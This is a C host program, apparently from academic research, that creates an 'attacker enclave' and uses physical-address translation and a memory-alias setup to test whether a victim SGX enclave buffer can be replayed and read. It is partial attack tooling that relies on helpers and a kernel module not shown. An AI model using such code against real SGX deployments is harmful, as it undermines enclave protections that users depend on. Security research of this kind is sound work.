#include <sgx_urts.h>
#include "Enclave/are_encl_u.h"
#include <unistd.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include "libsgxstep/pt.h"
#include "libsgxstep/debug.h"

#include "readalias.h"
#include "mem_range_repo.h"
#include "helpers.h"

#define DBG_ENCL           1
#define ALIAS_BIT          34
#define ALLOC_SIZE         1*PAGE_SIZE


sgx_enclave_id_t eid = 0;
unsigned char epc_buf1[ALLOC_SIZE], epc_buf2[ALLOC_SIZE];

#define SGX_MAGIC 0xA4

#define SGX_IOC_EPC_PAGE_ADDR \
        _IOW(SGX_MAGIC, 0x00, struct sgx_epc_page_addr)

struct sgx_epc_page_addr  {
        unsigned long   pa;
        int alloc_nb;
        int nb_pages;
} __attribute__((__packed__));

// Hacky method to avoid linking problems :)
void* sgx_get_aep(void)
{
    return NULL;
}
void sgx_set_aep(void* aep)
{
}
void* sgx_get_tcs(void)
{
    return NULL;
}

/*void custom_hexdump(char* data, size_t data_len) {
    printf("hexdump buffer (%zu bytes):\n", data_len);
    for (size_t i = 0; i < data_len; i++) {
        printf("%02x ", (unsigned char)data[i]);
        if ((i + 1) % 32 == 0) { // Print 64 bytes per line
            printf("\n");
        }
    }
    printf("\n");
}*/

void custom_hexdump(char* data, size_t size) {
	char ascii[17];
	size_t i, j;
  int same=0;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
    if (i >= 16 && i%16 == 0 && memcmp(&data[i], &data[i-16], 16) == 0) {
      if (!same) {
        printf("*\n");
        same = 1;
      }
      i += 15;
      continue;
    }
    same = 0;
    if(i % 16 == 0) {
      printf("0x%06x: ", i);
    }
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
  printf("0x%06x: ", i);
}

page_stats_t stats;

int main( int argc, char **argv )
{
    if(argc != 2 ) {
        printf("Usage: ./app <victim buffer pa>\n");
        return -1;
    }

    if (open_kmod()) {
        err_log("Error: Unable to open drive.\n");
        return -1;
    }

    int sgx_fd;

    // Open the SGX driver
    sgx_fd = open("/dev/isgx", O_RDWR);
    if (sgx_fd < 0) {
        perror("Failed to open /dev/isgx\n");
        return -1;
    }

    struct sgx_epc_page_addr args;
    unsigned long victim_pa;
    if( do_stroul(argv[1], 0, &victim_pa)) {
        err_log("failed to parse '%s' as victim_pa\n", argv[1]);
        return -1;
    }
    args.pa = victim_pa;
    args.alloc_nb = 42;
    args.nb_pages = 9;
  
    // Call the first IOCTL command
    //ioctl(sgx_fd, SGX_IOC_EPC_PAGE_ADDR, &args);

    info_event("Creating attacker enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/are_encl.so", /*debug=*/DBG_ENCL,
                                    NULL, NULL, &eid, NULL ) );

    // Get the va of the buffer and translate it to its pa
    unsigned char *buffer;
    SGX_ASSERT( are_initialize_buffer(eid) );
    SGX_ASSERT( are_get_buffer_addr(eid, (void*)&buffer) );

    address_mapping_t *map = get_mappings(buffer);
    uint64_t pa = phys_address(map, PAGE);
   
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, pa);

    SGX_ASSERT( are_write_to_buffer(eid, 0x00) );
    SGX_ASSERT( are_flush_buffer(eid) );

    printf("Buffer is initialized to all zero\n");
    printf("Replay victim buffer and press enter");
    getchar();

    SGX_ASSERT( are_print_buffer(eid) );

    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info_event("Done.");

    return 0;
}
